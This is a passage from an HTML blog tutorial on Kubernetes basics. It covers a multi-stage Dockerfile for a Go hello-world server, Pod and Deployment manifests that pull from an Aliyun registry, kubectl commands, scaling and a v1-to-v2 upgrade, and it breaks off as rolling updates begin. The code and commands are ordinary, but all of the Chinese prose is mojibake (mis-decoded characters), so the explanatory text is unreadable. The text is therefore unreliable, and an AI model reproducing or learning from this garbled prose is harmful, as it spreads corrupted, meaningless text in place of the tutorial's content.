é›†ç¾¤ä¸­ï¼Œä¸ºäº†ä¼˜åŒ–ç½‘ç»œé€Ÿåº¦ï¼Œæˆ‘ä»¬é€‰æ‹©å…ˆåœ¨ <code>golang:1.16-buster</code> ä¸­å°†ä¸Šè¿° Go ä»£ç ç¼–è¯‘æˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå†å°†äºŒè¿›åˆ¶æ–‡ä»¶å¤åˆ¶åˆ° <code>base-debian10</code> é•œåƒä¸­è¿è¡Œ (Dockerfile ä¸ç†è§£æ²¡æœ‰å…³ç³»ï¼Œä¸å½±å“åç»­æ•™ç¨‹å­¦ä¹ )ã€‚</p><p>è¿™æ ·æˆ‘ä»¬å¯ä»¥å°† 300MB å¤§å°çš„é•œåƒå˜æˆåªæœ‰ 20MB çš„é•œåƒï¼Œç”šè‡³å‹ç¼©ä¸Šä¼ åˆ° DockerHub åå¤§å°åªæœ‰ 10MBï¼</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># Dockerfile</span><br><span class="hljs-keyword">FROM</span> golang:<span class="hljs-number">1.16</span>-buster AS builder<br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /src</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> . /src</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /src</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> go <span class="hljs-built_in">env</span> -w GO111MODULE=auto</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> go build -o main .</span><br><br><span class="hljs-keyword">FROM</span> gcr.io/distroless/base-debian10<br><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /</span><br><br><span class="hljs-keyword">COPY</span><span class="language-bash"> --from=builder /src/main /main</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">3000</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;/main&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„ <code>main.go</code> æ–‡ä»¶éœ€è¦å’Œ <code>Dockerfile</code> æ–‡ä»¶åœ¨åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œæ‰§è¡Œä¸‹æ–¹ <code>docker build</code> å‘½ä»¤ï¼Œç¬¬ä¸€æ¬¡éœ€è¦è€å¿ƒç­‰å¾…æ‹‰å–åŸºç¡€é•œåƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build . -t hellok8s:v1<br>docker run -p 3000:3000 --name hellok8s -d hellok8s:v1<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250426232154933.png" alt="image-20250426232154933"></p><p>ps:ä½¿ç”¨<code>minihube ip</code>ç»™å‡ºçš„ipå’Œå®é™…ä¸Šçš„ipä¸ä¸€æ ·ï¼Œå› ä¸º Minikube åœ¨æœ¬åœ°åˆ›å»ºäº†ä¸€ä¸ªç‹¬ç«‹çš„è™šæ‹ŸåŒ–ç¯å¢ƒï¼ˆå¦‚è™šæ‹Ÿæœºæˆ–å®¹å™¨ï¼‰ï¼Œè¯¥ç¯å¢ƒæ‹¥æœ‰è‡ªå·±çš„ç½‘ç»œæ¥å£å’Œ IP åœ°å€,è¿™ç§è®¾è®¡ä½¿å¾— Minikube é›†ç¾¤ä¸ä¸»æœºç³»ç»Ÿåœ¨ç½‘ç»œä¸Šç›¸äº’éš”ç¦»ï¼Œä»è€Œé¿å…äº†æ½œåœ¨çš„ç«¯å£å†²çªå’Œå®‰å…¨é—®é¢˜ã€‚</p><h1 id="Pod"><a href="#Pod" class="headerlink" title="Pod"></a>Pod</h1><p>å¦‚æœåœ¨ç”Ÿäº§ç¯å¢ƒä¸­è¿è¡Œçš„éƒ½æ˜¯ç‹¬ç«‹çš„å•ä½“æœåŠ¡ï¼Œé‚£ä¹ˆ Container (å®¹å™¨) ä¹Ÿå°±å¤Ÿç”¨äº†ï¼Œä½†æ˜¯åœ¨å®é™…çš„ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œç»´æŠ¤ç€å¤§è§„æ¨¡çš„é›†ç¾¤å’Œå„ç§ä¸åŒçš„æœåŠ¡ï¼ŒæœåŠ¡ä¹‹é—´å¾€å¾€å­˜åœ¨ç€å„ç§å„æ ·çš„å…³ç³»ã€‚è€Œè¿™äº›å…³ç³»çš„å¤„ç†ï¼Œæ‰æ˜¯æ‰‹åŠ¨ç®¡ç†æœ€å›°éš¾çš„åœ°æ–¹ã€‚</p><p><strong>Pod</strong> æ˜¯æˆ‘ä»¬å°†è¦åˆ›å»ºçš„ç¬¬ä¸€ä¸ª k8s èµ„æºï¼Œä¹Ÿæ˜¯å¯ä»¥åœ¨ Kubernetes ä¸­åˆ›å»ºå’Œç®¡ç†çš„ã€æœ€å°çš„å¯éƒ¨ç½²çš„è®¡ç®—å•å…ƒã€‚åœ¨äº†è§£ <code>pod</code> å’Œ <code>container</code> çš„åŒºåˆ«ä¹‹å‰ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ªç®€å•çš„ pod è¯•è¯•ï¼Œ</p><p>æˆ‘ä»¬å…ˆæŠŠåˆšåˆšçš„é•œåƒä¸Šä¼ åˆ°<code>aliyun</code>ï¼Œæˆ‘ä»¬ç¼–å†™ä¸€ä¸ªyamlæ¥ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># hellok8s.yaml</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-pod</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com/xpshub/k8s:v1</span><br>  <span class="hljs-attr">imagePullSecrets:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">é˜¿é‡Œäº‘å¯†ç </span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>kind</code> è¡¨ç¤ºæˆ‘ä»¬è¦åˆ›å»ºçš„èµ„æºæ˜¯ <code>Pod</code> ç±»å‹ï¼Œ <code>metadata.name</code> è¡¨ç¤ºè¦åˆ›å»ºçš„ pod çš„åå­—ï¼Œè¿™ä¸ªåå­—éœ€è¦æ˜¯å”¯ä¸€çš„ã€‚ <code>spec.containers</code> è¡¨ç¤ºè¦è¿è¡Œçš„å®¹å™¨çš„åç§°å’Œé•œåƒåœ°å€ã€‚</p><p>æˆ‘ä»¬è¿è¡Œç¬¬ä¸€æ¡ k8s å‘½ä»¤ <code>kubectl apply -f hellok8s.yaml</code> å‘½ä»¤æ¥åˆ›å»º <code>hellok8s</code> Podã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨<code>kubectl get pods</code>æ¥æŸ¥çœ‹podçŠ¶æ€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ kubectl get pods<br>NAME           READY   STATUS             RESTARTS   AGE<br>hellok8s-pod   0/1     running   0          51s<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨<code>kubectl port-forward hellok8s-pod 4000:3000</code>å°† é•œåƒçš„<code>3000</code>ç«¯å£æ˜ å°„åˆ°æœ¬æœºçš„ <code>4000</code> ç«¯å£</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">curl http:<span class="hljs-comment">//127.0.0.1:4000</span><br><span class="hljs-string">[v1]</span> Hello, Kubernetes!<br></code></pre></td></tr></table></figure><h2 id="Pod-ä¸-Container-çš„ä¸åŒ"><a href="#Pod-ä¸-Container-çš„ä¸åŒ" class="headerlink" title="Pod ä¸ Container çš„ä¸åŒ"></a>Pod ä¸ Container çš„ä¸åŒ</h2><p>å›åˆ° <code>pod</code> å’Œ <code>container</code> çš„åŒºåˆ«ï¼Œæˆ‘ä»¬ä¼šå‘ç°åˆšåˆšåˆ›å»ºå‡ºæ¥çš„èµ„æºå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåœ¨æœ€å†…å±‚æ˜¯æˆ‘ä»¬çš„æœåŠ¡ <code>hellok8s</code>ï¼Œè¿è¡Œåœ¨ <code>container</code> å®¹å™¨å½“ä¸­ï¼Œ <code>container</code> (å®¹å™¨) çš„æœ¬è´¨æ˜¯è¿›ç¨‹ï¼Œè€Œ <code>pod</code> æ˜¯ç®¡ç†è¿™ä¸€ç»„è¿›ç¨‹çš„èµ„æºã€‚</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/nginx_pod.png" alt="nginx_pod"></p><p>æ‰€ä»¥è‡ªç„¶ <code>pod</code> å¯ä»¥ç®¡ç†å¤šä¸ª <code>container</code>ï¼Œåœ¨æŸäº›åœºæ™¯ä¾‹å¦‚æœåŠ¡ä¹‹é—´éœ€è¦æ–‡ä»¶äº¤æ¢(æ—¥å¿—æ”¶é›†)ï¼Œæœ¬åœ°ç½‘ç»œé€šä¿¡éœ€æ±‚(ä½¿ç”¨ localhost æˆ–è€… Socket æ–‡ä»¶è¿›è¡Œæœ¬åœ°é€šä¿¡)ï¼Œåœ¨è¿™äº›åœºæ™¯ä¸­ä½¿ç”¨ <code>pod</code> ç®¡ç†å¤šä¸ª <code>container</code> å°±éå¸¸çš„æ¨èã€‚è€Œè¿™ï¼Œä¹Ÿæ˜¯ k8s å¦‚ä½•å¤„ç†æœåŠ¡ä¹‹é—´å¤æ‚å…³ç³»çš„ç¬¬ä¸€ä¸ªä¾‹å­ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/pod.png" alt="pod"></p><h2 id="Pod-å…¶å®ƒå‘½ä»¤"><a href="#Pod-å…¶å®ƒå‘½ä»¤" class="headerlink" title="Pod å…¶å®ƒå‘½ä»¤"></a>Pod å…¶å®ƒå‘½ä»¤</h2><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>logs</code> æˆ–è€… <code>logs -f</code> å‘½ä»¤æŸ¥çœ‹ pod æ—¥å¿—ï¼Œå¯ä»¥é€šè¿‡ <code>exec -it</code> è¿›å…¥ pod æˆ–è€…è°ƒç”¨å®¹å™¨å‘½ä»¤ï¼Œé€šè¿‡ <code>delete pod</code> æˆ–è€… <code>delete -f hellok8s.yaml</code> çš„æ–¹å¼åˆ é™¤ pod èµ„æºã€‚è¿™é‡Œå¯ä»¥çœ‹åˆ° <a href="https://kubernetes.io/docs/reference/kubectl/cheatsheet/">kubectl æ‰€æœ‰å‘½ä»¤</a>ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl logs --follow hellok8s<br>                              <br>kubectl exec hellok8s -- ls<br><br>kubectl delete pod hellok8s<br><span class="hljs-meta prompt_"># </span><span class="language-bash">pod <span class="hljs-string">&quot;hellok8s&quot;</span> deleted</span><br><br>kubectl delete -f hellok8s.yaml<br><span class="hljs-meta prompt_"># </span><span class="language-bash">pod <span class="hljs-string">&quot;hellok8s&quot;</span> deleted</span><br></code></pre></td></tr></table></figure><p>ç›¸åº”çš„å‘½ä»¤å¦‚ä¸‹æ‰€ç¤º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f hellok8s.yaml<br><br>kubectl get pods<br><br>kubectl port-forward hellok8s 3000:3000<br></code></pre></td></tr></table></figure><p>å…³äºå¯åŠ¨å¤±è´¥</p><p>å¦‚æœæŸ¥çœ‹Podçš„çŠ¶æ€ä¸º ErrImagePull æˆ–è€… ImagePullBackOff</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">NAME       READY   STATUS             RESTARTS   AGE<br>hellok8s   0/1     ImagePullBackOff   0          22m<br></code></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨çš„æ˜¯docker-hub å°è¯•åˆ‡æ¢ä¸ºå½“å‰ç¯å¢ƒçš„docker-env, åˆ é™¤pod, ç„¶åé‡æ–°æ„å»ºé•œåƒå³å¯</p><ul><li>å®˜æ–¹æ–‡æ¡£: <a href="https://minikube.sigs.k8s.io/docs/handbook/pushing/">Pushing directly to the in-cluster Docker daemon (docker-env)</a></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">eval $(minikube docker-env)<br></code></pre></td></tr></table></figure><p>å¦‚æœä½¿ç”¨çš„æ˜¯ä¸‰æ–¹é•œåƒæ‰˜ç®¡ï¼Œå†æ£€æŸ¥ä½ çš„<code>imagePullSecrets</code>å­—æ®µæœ‰æ²¡æœ‰é”™è¯¯</p><h1 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h1><p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬åŸºæœ¬ä¸Šä¸ä¼šç›´æ¥ç®¡ç† podï¼Œæˆ‘ä»¬éœ€è¦ <code>kubernetes</code> æ¥å¸®åŠ©æˆ‘ä»¬æ¥å®Œæˆä¸€äº›è‡ªåŠ¨åŒ–æ“ä½œï¼Œä¾‹å¦‚è‡ªåŠ¨æ‰©å®¹æˆ–è€…è‡ªåŠ¨å‡çº§ç‰ˆæœ¬ã€‚å¯ä»¥æƒ³è±¡åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬æ‰‹åŠ¨éƒ¨ç½²äº† 10 ä¸ª <code>hellok8s:v1</code> çš„ podï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦å‡çº§æˆ <code>hellok8s:v2</code> ç‰ˆæœ¬ï¼Œæˆ‘ä»¬éš¾é“éœ€è¦ä¸€ä¸ªä¸€ä¸ªçš„å°† <code>hellok8s:v1</code> çš„ pod æ‰‹åŠ¨å‡çº§å—ï¼Ÿ</p><p>è¿™ä¸ªæ—¶å€™å°±éœ€è¦æˆ‘ä»¬æ¥çœ‹ <code>kubeates</code> çš„å¦å¤–ä¸€ä¸ªèµ„æº <code>deployment</code>ï¼Œæ¥å¸®åŠ©æˆ‘ä»¬ç®¡ç† pod</p><h2 id="æ‰©å®¹"><a href="#æ‰©å®¹" class="headerlink" title="æ‰©å®¹"></a>æ‰©å®¹</h2><p>é¦–å…ˆå¯ä»¥åˆ›å»ºä¸€ä¸ª <code>deployment.yaml</code> çš„æ–‡ä»¶ã€‚æ¥ç®¡ç† <code>hellok8s</code> podã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-container</span><br>          <span class="hljs-attr">image:</span> <span class="hljs-string">crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com/xpshub/k8s:v1</span><br>      <span class="hljs-attr">imagePullSecrets:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">é˜¿é‡Œäº‘å¯†ç </span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ <code>kind</code> è¡¨ç¤ºæˆ‘ä»¬è¦åˆ›å»ºçš„èµ„æºæ˜¯ <code>deployment</code> ç±»å‹ï¼Œ <code>metadata.name</code> è¡¨ç¤ºè¦åˆ›å»ºçš„ deployment çš„åå­—ï¼Œè¿™ä¸ªåå­—éœ€è¦æ˜¯<strong>å”¯ä¸€</strong>çš„ã€‚</p><p>åœ¨ <code>spec</code> é‡Œé¢è¡¨ç¤ºï¼Œé¦–å…ˆ <code>replicas</code> è¡¨ç¤ºçš„æ˜¯éƒ¨ç½²çš„ pod å‰¯æœ¬æ•°é‡ï¼Œ<code>selector</code> é‡Œé¢è¡¨ç¤ºçš„æ˜¯ <code>deployment</code> èµ„æºå’Œ <code>pod</code> èµ„æºå…³è”çš„æ–¹å¼ï¼Œè¿™é‡Œè¡¨ç¤º <code>deployment</code> ä¼šç®¡ç† (selector) æ‰€æœ‰ <code>labels=hellok8s</code> çš„ podã€‚</p><p><code>template</code> çš„å†…å®¹æ˜¯ç”¨æ¥å®šä¹‰ <code>pod</code> èµ„æºçš„ï¼Œä½ ä¼šå‘ç°å’ŒHellok8s Pod èµ„æºçš„å®šä¹‰æ˜¯å·®ä¸å¤šçš„ï¼Œå”¯ä¸€çš„åŒºåˆ«æ˜¯æˆ‘ä»¬éœ€è¦åŠ ä¸Š <code>metadata.labels</code> æ¥å’Œä¸Šé¢çš„ <code>selector.matchLabels</code> å¯¹åº”èµ·æ¥ã€‚æ¥è¡¨æ˜ pod æ˜¯è¢« deployment ç®¡ç†ï¼Œä¸ç”¨åœ¨<code>template</code> é‡Œé¢åŠ ä¸Š <code>metadata.name</code> æ˜¯å› ä¸º deployment ä¼šä¸»åŠ¨ä¸ºæˆ‘ä»¬åˆ›å»º pod çš„å”¯ä¸€<code>name</code>ã€‚</p><p>æ¥ä¸‹æ¥è¾“å…¥ä¸‹é¢çš„å‘½ä»¤ï¼Œå¯ä»¥åˆ›å»º <code>deployment</code> èµ„æºã€‚é€šè¿‡ <code>get</code> å’Œ <code>delete pod</code> å‘½ä»¤ï¼Œæˆ‘ä»¬ä¼šåˆæ­¥æ„Ÿå— deployment çš„é­…åŠ›ã€‚<strong>æ¯æ¬¡åˆ›å»ºçš„ pod åç§°éƒ½ä¼šå˜åŒ–ï¼ŒæŸäº›å‘½ä»¤è®°å¾—æ›¿æ¢æˆä½ çš„ pod çš„åç§°</strong></p><p>å½“æ‰‹åŠ¨åˆ é™¤ä¸€ä¸ª <code>pod</code> èµ„æºåï¼Œdeployment ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæ–°çš„ <code>pod</code>ï¼Œè¿™å’Œæˆ‘ä»¬ä¹‹å‰æ‰‹åŠ¨åˆ›å»º pod èµ„æºæœ‰æœ¬è´¨çš„åŒºåˆ«ï¼è¿™ä»£è¡¨ç€å½“ç”Ÿäº§ç¯å¢ƒç®¡ç†ç€æˆåƒä¸Šä¸‡ä¸ª pod æ—¶ï¼Œæˆ‘ä»¬ä¸éœ€è¦å…³å¿ƒå…·ä½“çš„æƒ…å†µï¼Œåªéœ€è¦ç»´æŠ¤å¥½è¿™ä»½ <code>deployment.yaml</code> æ–‡ä»¶çš„èµ„æºå®šä¹‰å³å¯</p><p>å½“æˆ‘ä»¬æƒ³è¦å°† <code>hellok8s:v1</code> çš„èµ„æºæ‰©å®¹åˆ° 3 ä¸ªå‰¯æœ¬æ—¶ï¼Œåªéœ€è¦å°† <code>replicas</code> çš„å€¼è®¾ç½®æˆ 3ï¼Œæ¥ç€é‡æ–°è¾“å…¥ <code>kubectl apply -f deployment.yaml</code> å³å¯</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-container</span><br>          <span class="hljs-attr">image:</span> <span class="hljs-string">crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com/xpshub/k8s:v1</span><br>      <span class="hljs-attr">imagePullSecrets:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">é˜¿é‡Œäº‘å¯†ç </span><br></code></pre></td></tr></table></figure><p>å¯ä»¥åœ¨ <code>kubectl apply</code> ä¹‹å‰é€šè¿‡æ–°å»ºçª—å£æ‰§è¡Œ <code>kubectl get pods --watch</code> å‘½ä»¤æ¥è§‚å¯Ÿ pod å¯åŠ¨å’Œåˆ é™¤çš„è®°å½•ï¼Œæƒ³è¦å‡å°‘å‰¯æœ¬æ•°æ—¶ä¹Ÿå¾ˆç®€å•ï¼Œä½ å¯ä»¥å°è¯•å°†å‰¯æœ¬æ•°éšæ„å¢å¤§æˆ–è€…ç¼©å°ï¼Œå†é€šè¿‡ <code>watch</code> æ¥è§‚å¯Ÿå®ƒçš„çŠ¶æ€</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/deployment.png" alt="deployment"></p><h2 id="å‡çº§ç‰ˆæœ¬"><a href="#å‡çº§ç‰ˆæœ¬" class="headerlink" title="å‡çº§ç‰ˆæœ¬"></a>å‡çº§ç‰ˆæœ¬</h2><p>æˆ‘ä»¬æ¥ä¸‹æ¥å°è¯•å°†æ‰€æœ‰ <code>v1</code> ç‰ˆæœ¬çš„ <code>pod</code> å‡çº§åˆ° <code>v2</code> ç‰ˆæœ¬ã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦æ„å»ºä¸€ä»½ <code>hellok8s:v2</code> çš„ç‰ˆæœ¬é•œåƒã€‚å”¯ä¸€çš„åŒºåˆ«å°±æ˜¯å­—ç¬¦ä¸²æ›¿æ¢æˆäº† <code>[v2] Hello, Kubernetes!</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>io.WriteString(w, <span class="hljs-string">&quot;[v2] Hello, Kubernetes!&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, hello)<br>http.ListenAndServe(<span class="hljs-string">&quot;:3000&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>æ„å»ºå¥½é•œåƒä¸Šä¼ åˆ°aliyunï¼Œæ”¹å˜deploymentçš„é•œåƒä¸ºv2</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-container</span><br>          <span class="hljs-attr">image:</span> <span class="hljs-string">crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com/xpshub/k8s:v2</span><br>      <span class="hljs-attr">imagePullSecrets:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">é˜¿é‡Œäº‘å¯†ç </span><br><br></code></pre></td></tr></table></figure><p>åº”ç”¨è¿™ä¸ªdeploymentï¼Œä½¿ç”¨è¿™ä¸ªå‘½ä»¤<code>kubectl describe pod id</code>çœ‹åˆ°é•œåƒæ˜¯v2ç‰ˆæœ¬çš„ï¼Œ</p><p>ä½¿ç”¨<code>kubectl port-forward hellok8s-deployment-7b46d8bd86-2v9g4 4000:3000</code></p><p>çœ‹åˆ°æ˜¯è¾“å‡º<code>[v2] Hello, Kubernetes!</code></p><h2 id="Rolling-Update-æ»šåŠ¨æ›´æ–°"><a href="#Rolling-Update-æ»šåŠ¨æ›´æ–°" class="headerlink" title="Rolling Update(æ»šåŠ¨æ›´æ–°)"></a>Rolling Update(æ»šåŠ¨æ›´æ–°)</h2><p>å¦‚æœæˆ‘ä»¬åœ¨ç”Ÿäº§ç¯å¢ƒä¸Šï¼Œç®¡ç†ç€å¤šä¸ªå‰¯æœ¬çš„ <code>hellok8s:v1</code> ç‰ˆæœ¬çš„ podï¼Œæˆ‘ä»¬éœ€è¦æ›´æ–°åˆ° <code>v2</code> çš„ç‰ˆæœ¬ï¼Œåƒä¸Šé¢é‚£æ 